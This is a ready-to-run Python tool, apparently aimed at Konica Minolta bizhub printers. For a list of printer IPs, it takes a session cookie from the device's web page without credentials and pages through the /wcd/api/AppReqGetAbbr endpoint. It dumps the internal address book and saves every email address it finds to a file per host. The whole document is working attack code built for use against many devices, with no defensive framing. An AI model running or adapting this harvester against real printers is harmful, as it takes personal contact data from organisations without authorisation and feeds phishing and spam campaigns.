#!/usr/bin/env python3
import argparse
import requests
import sys
import json
import os

# Suppress the "InsecureRequestWarning" about verify=False
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter("ignore", InsecureRequestWarning)

CHUNK_SIZE = 50  # Number of entries to request each time

def get_working_protocol(host, debug=False):
    """
    Try HTTP first, then fallback to HTTPS if HTTP fails.
    Ensures consistency for all requests to the same host.
    """
    test_url_http = f"http://{host}/wcd/index.html"
    test_url_https = f"https://{host}/wcd/index.html"

    for protocol in ["http", "https"]:
        url = test_url_http if protocol == "http" else test_url_https
        try:
            r = requests.get(url, verify=False, timeout=5)
            r.raise_for_status()
            if debug:
                print(f"[DEBUG] {protocol.upper()} works for {host}, using {protocol} for all requests.")
            return protocol
        except requests.exceptions.RequestException:
            if debug:
                print(f"[DEBUG] {protocol.upper()} failed for {host}, trying alternate.")
            continue

    print(f"[X] No working protocol found for {host}. Skipping.")
    return None

def auto_get_cookie(host, protocol, debug=False):
    """
    Perform a GET to {protocol}://<host>/wcd/index.html to see if the device sets an 'ID' cookie automatically.
    """
    url = f"{protocol}://{host}/wcd/index.html"
    session = requests.Session()
    
    try:
        r = session.get(url, verify=False, timeout=10)
        if debug:
            print(f"[DEBUG] GET {url} -> status {r.status_code}")
            print("[DEBUG] Response headers:\n", r.headers)

        r.raise_for_status()
        if "ID" in session.cookies:
            if debug:
                print("[DEBUG] Auto-fetched cookies in session:")
                for ck in session.cookies:
                    print("   ", ck.name, "=", ck.value)
            return session
        else:
            if debug:
                print("[DEBUG] No 'ID' cookie was set by GET /wcd/index.html.")
            return None
    except requests.exceptions.RequestException as e:
        if debug:
            print(f"[DEBUG] Error auto-fetching cookie from {host}: {e}")
        return None

def fetch_abbr_chunk(host, protocol, session=None, start=1, end=50, debug=False):
    """
    Fetch one chunk (start..end) from /wcd/api/AppReqGetAbbr using the detected protocol.
    Returns the parsed JSON dict (or None on failure).
    """
    url = f"{protocol}://{host}/wcd/api/AppReqGetAbbr"
    
    payload = {
        "AbbrListCondition": {
            "WellUse": "false",
            "SearchKey": "None",
            "ObtainCondition": {
                "Type": "IndexList",
                "IndexRange": {
                    "Start": start,
                    "End": end
                }
            },
            "SortInfo": {
                "Condition": "No",
                "Order": "Ascending"
            },
            "AddressKind": "Public",
            "SearchSendMode": "0"
        }
    }

    try:
        if session:
            if debug:
                print(f"[DEBUG] Fetching {start}-{end} using session cookies.")
            resp = session.post(url, json=payload, verify=False, timeout=15)
        else:
            if debug:
                print(f"[DEBUG] Fetching {start}-{end} without session cookies.")
            resp = requests.post(url, json=payload, verify=False, timeout=15)

        if debug:
            print(f"[DEBUG] chunk {start}-{end} -> HTTP {resp.status_code}")

        if resp.status_code == 200:
            return resp.json()
        else:
            if debug:
                print("[DEBUG] Non-200 status code:", resp.status_code)
                print("[DEBUG] Body snippet:", resp.text[:300])
            return None
    except requests.exceptions.RequestException as e:
        if debug:
            print(f"[DEBUG] RequestException chunk {start}-{end}: {e}")
        return None

def fetch_all_abbr(host, protocol, session=None, debug=False):
    """
    Fetch all address entries by chunking in increments of CHUNK_SIZE (50).
    Returns (allAbbrList, arraySize) or ([], 0) if nothing found or error.
    """
    all_abbr = []
    current_start = 1

    data = fetch_abbr_chunk(host, protocol, session=session, start=current_start,
                            end=current_start + CHUNK_SIZE - 1, debug=debug)
    if not data:
        return ([], 0)

    mfp_obj = data.get("MFP", {})
    abbr_list_data = mfp_obj.get("AbbrList", {})
    total_size = int(abbr_list_data.get("ArraySize", "0"))

    first_chunk_abbr = abbr_list_data.get("Abbr", [])
    all_abbr.extend(first_chunk_abbr)

    while len(first_chunk_abbr) == CHUNK_SIZE and (total_size > len(all_abbr)):
        current_start += CHUNK_SIZE
        next_end = current_start + CHUNK_SIZE - 1

        data = fetch_abbr_chunk(host, protocol, session=session, start=current_start, end=next_end, debug=debug)
        if not data:
            break

        mfp_obj = data.get("MFP", {})
        abbr_list_data = mfp_obj.get("AbbrList", {})
        chunk_abbr = abbr_list_data.get("Abbr", [])
        all_abbr.extend(chunk_abbr)

    return (all_abbr, total_size)

def extract_names_and_emails(abbr_entries):
    """Extracts names and emails from the fetched address book data."""
    names = []
    emails = []

    for entry in abbr_entries:
        name = entry.get("Name", "").strip()
        to_email = entry.get("SendConfiguration", {}).get("AddressInfo", {}).get("EmailMode", {}).get("To", "").strip()

        if name:
            names.append(name)
        if to_email:
            emails.append(to_email)

    return (names, emails)

def process_host(host, debug=False):
    """Handles the full address book extraction for a single host."""
    protocol = get_working_protocol(host, debug)
    if not protocol:
        return

    session = auto_get_cookie(host, protocol, debug=debug)
    if not session:
        print(f"[!] Could not retrieve an ID cookie automatically from {host}. Skipping.")
        return

    abbr_list, array_size = fetch_all_abbr(host, protocol, session=session, debug=debug)

    if not abbr_list:
        print("    [!] No address book entries found.")
        return

    names, emails = extract_names_and_emails(abbr_list)

    if not emails:
        print("    [!] No email addresses found.")
        return

    email_filename = f"bizhub-addrBk_emailAddr_{host}.txt"
    with open(email_filename, "w", encoding="utf-8") as f:
        for em in sorted(set(emails)):
            f.write(em + "\n")

    print(f"    -> Emails saved to: {email_filename}")

def main():
    parser = argparse.ArgumentParser(description="Extract internal address books from network printers.")
    parser.add_argument("-i", "--input", help="File containing list of printer IPs", required=True)
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug output")

    args = parser.parse_args()

    with open(args.input, "r", encoding="utf-8") as f:
        for line in f:
            host = line.strip()
            if host:
                process_host(host, debug=args.debug)

if __name__ == "__main__":
    main()
